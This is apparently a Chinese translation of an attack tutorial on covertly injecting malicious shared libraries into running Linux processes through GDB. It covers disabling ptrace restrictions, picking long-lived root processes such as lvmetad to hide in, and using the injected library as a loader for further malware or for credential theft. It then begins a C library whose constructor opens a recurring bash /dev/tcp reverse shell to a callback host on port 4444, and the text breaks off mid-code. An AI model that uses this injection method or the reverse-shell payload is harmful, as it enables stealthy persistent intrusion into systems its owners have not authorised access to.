原文：
在本文中，我们将为读者介绍如何在Linux中轻松实现进程注入的方法。目前，网上流传的进程注入技术，通常都会用到[ptrace(2)](https://github.com/gaffe23/linux-inject "ptrace\(2\)")或[LD_PRELOAD](https://www.datawire.io/code-injection-on-linux-and-macos/
"LD_PRELOAD")，但是这些都无法满足我的要求，因为我想要使用一些更简单、更不容易出错的技术，当然，易用性可能是以灵活性、工作效率和通用性为代价的。接下来，我们将为读者讲解如何通过GDB和共享对象文件（即程序库）来实现进程注入。
GDB是一种GNU调试器，常用于“逮住”一个正在运行的进程以进行调试，同时，它还提供了一个有趣的特性：可以让处于调试中的进程调用库函数。为了将程序库加载到程序中，可以使用下面两个函数：liblo的dlopen(3)函数和libc提供的
**libc_dlopen_mode函数。在这里，我们使用的是** libc_dlopen_mode，因为它不要求为主机进程链接libdl。
原则上，我们可以先加载程序库，然后让GDB调用其中的函数。但是，更简单的做法是，使用另一个线程通过程序库的构造函数来完成需要手动执行的所有操作，以将进程的“停摆”时间降到最低。
**注意事项**
需要注意的是，虽然本文介绍的方法简单易用，但是凡事有利就有弊——它在灵活性、通用性和注入方式方面存在一些限制。当然，在实践中这些都不是什么大的问题，不过，下面几个事项还是需要认真对待的。
**ptrace(2)**
为了附加进程，我们需要使用ptrace(2)来，换句话说，我们需要用到GDB。一般来说，超级用户通常可以做到这一点，但作为普通用户，我们只能附加到隶属于自己的进程上。为安全性起见，有些系统只允许进程附加到其子进程上，对于这种情况，虽然可以通过修改sysctl取消这种限制，但是，要想修改sysctl的话，则要求具有root权限，所以这种方式在实战中意义不是很大。
    sysctl kernel.yama.ptrace_scope=0
    # or
    echo 0 > /proc/sys/kernel/yama/ptrace_scope
一般来说，最好以root身份执行上述操作。
**“停摆”的进程**
当GDB连接到一个进程时，该进程就会停止运行。因此，最好事先编好脚本，让脚本来执行相应的GDB的操作，并使用-x和--batch选项，或联合使用echo和GDB命令，以最大限度地减少进程的停止时间。如果由于某种原因，GDB在退出时没有重新启动进程的话，那么可以向进程发送SIGCONT信号，这样就可以重新启动该进程了。
kill -CONT 
**进程之死**
程序库一旦加载并运行后，任何能够导致该库出错的东西（例如segfaults）都会影响到整个进程。同样，如果程序库向output文件写消息或将消息发送到syslog的话，显示的消息来源为进程，而非程序库。所以，利用注入的程序库作为加载程序，然后在新进程中启动真正的恶意软件是一个非常不错的方法。
**进入正题**
介绍完需要注意的事项之后，下面进入正题——如何利用GDB实现进程注入。我们假设这里是通过ssh访问目标系统的，但从理论角度来说，这些过程都可以（应该）实现脚本化，然后通过shell/sql/文件注入或任何其他方法运行这些脚本即可。
**选择进程**
第一步是找到要注入的进程。为此，可以查看进程列表，具体命令如下所示：
    root@ubuntu-s-1vcpu-1gb-nyc1-01:~# ps -fxo pid,user,args | egrep -v ' \[\S+\]$'
      PID USER     COMMAND
        1 root     /sbin/init
      625 root     /lib/systemd/systemd-journald
      664 root     /sbin/lvmetad -f
      696 root     /lib/systemd/systemd-udevd
     1266 root     /sbin/iscsid
     1267 root     /sbin/iscsid
     1273 root     /usr/lib/accountsservice/accounts-daemon
     1278 root     /usr/sbin/sshd -D
     1447 root      \_ sshd: root@pts/1
     1520 root          \_ -bash
     1538 root              \_ ps -fxo pid,user,args
     1539 root              \_ grep -E --color=auto -v  \[\S+\]$
     1282 root     /lib/systemd/systemd-logind
     1295 root     /usr/bin/lxcfs /var/lib/lxcfs/
     1298 root     /usr/sbin/acpid
     1312 root     /usr/sbin/cron -f
     1316 root     /usr/lib/snapd/snapd
     1356 root     /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog
     1358 root     /usr/lib/policykit-1/polkitd --no-debug
     1413 root     /sbin/agetty --keep-baud 115200 38400 9600 ttyS0 vt220
     1415 root     /sbin/agetty --noclear tty1 linux
     1449 root     /lib/systemd/systemd --user
     1451 root      \_ (sd-pam)
在列出的这些进程中，有一些不错的选择对象。在理想情况下，最好选择那些需要长期运行进程，因为这些进程通常不会被人终止。一般情况下，选择的进程的pids值越低越好，因为这个值越低，代表运行的时间越早，换句话说，没有人知道这些进程一旦被杀死会出现什么后果。另外，在进行进程注入的时候，最好以root身份进行，这样就不用担心权限不足的问题了。当然，最理想的注入目标就是那些既没有人想要终止它，而杀死它也不会带来任何影响的进程。
在某些情况下，如果注入的代码只需要运行很短的时间（例如检测输入框，获取凭证然后离开），或者如果大概率需要以很艰难的方式停止的话，那么以普通用户身份运行、运行时间较短的、可杀死的进程就是不错的注入目标。所以，我们要根据具体的情况进行取舍。
本例中，我们将使用664 root/sbin/lvmetad
-f。因为我们想做的任何事情，都可以借助它来完成，并且如果出现问题，也可以重新启动它，所以用起来还是很方便的。
**恶意软件**
实际上，我们几乎可以注入任何的Linux共享对象文件。作为演示，这里将使用一个小文件，但我曾经注入过一个大小为好几M的后门软件（用Go编写）。需要说明的是，本文中的许多操作都是借助[pcapknock](https://github.com/magisterquis/pcapknock
"pcapknock")完成的。
此外，为简洁起见，很多错误处理已被忽略。现实中，要想从注入库的构造函数获得有意义的错误输出的话，直接使用warn("something");
return;是不太可能的，因为事情远没有这么简单，除非你完全信任受害者进程给出的标准错误信息。
    #include 
    #include 
    #include 
    #define SLEEP  120                    /* Time to sleep between callbacks */
    #define CBADDR ""           /* Callback address */
    #define CBPORT "4444"                 /* Callback port */
    /* Reverse shell command */
    #define CMD "echo 'exec >&/dev/tcp/"\
                CBADDR "/" CBPORT "; exec 0>&1' | /bin/bash"
    void *callback(void *a);
    __attribute__((constructor)) /* Run this function on library load */
    void start_callbacks(){
            pthread_t tid;
            pthread_attr_t attr;
            /* Start thread detached */
            if (-1 == pthread_attr_init(&attr)) {
                    return;
            }
            if (-1 == pthread_attr_setdetachstate(&attr,